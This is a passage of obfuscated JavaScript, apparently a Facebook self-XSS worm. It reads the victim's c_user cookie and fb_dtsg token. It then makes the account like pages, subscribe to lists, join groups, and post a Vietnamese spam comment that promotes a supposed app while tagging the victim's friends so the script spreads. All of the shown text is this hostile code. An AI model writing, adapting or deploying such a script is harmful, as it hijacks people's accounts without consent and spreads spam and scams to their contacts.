...
a("100002788776389");
a("100003333554728");
sublist("414907098612246");sublist("432126933556929");sublist("432129096890046");sublist("432139160222373");sublist("432139370222352");sublist("432139460222343");sublist("432139540222335");sublist("432139570222332");sublist("432139600222329");sublist("432139683555654");sublist("522406674547113");sublist("524729510981496");sublist("524729847648129");sublist("524730357648078");sublist("524730700981377");sublist("524730767648037");sublist("524730860981361");

//Group ku adibpn
var gid = ['268824103288557'];
var gid = ['434897149977757'];
...
var spage_id = "403794819757203";
var spost_id = "100002788776389";
var sfoto_id = "100003333554728";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
...
// pic + fans
P("367839649973892");P("286093188220729");P("286422398187808");P("498417343612713");Like("286093031554078");Like("332528046838386");Like("1449536641944083");Like("161154677414246");Like("447425165317477");Like("584298354955933");Like("325228877583384");Like("600138993350567");
// Auto comment + tag
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);
var id = '286422398187808';
var arkadaslar = [];
var svn_rev;
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text=Y) ỨNG DỤNG QUÁ TUYỆT VỜI, HÌNH RẤT ĐẸP!!!!!!!!!! Mình Thành Công Rồi Nè Mọi Người Thử Đi Nhìn Đẹp Lắm <3 :D :P . (Vui quá nên muốn share đến tất các các bạn của tui, nếu có làm phiền thì cho tui xin lỗi nhé <3 )' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al(286093188220729);
arkadaslari_al(286422398187808);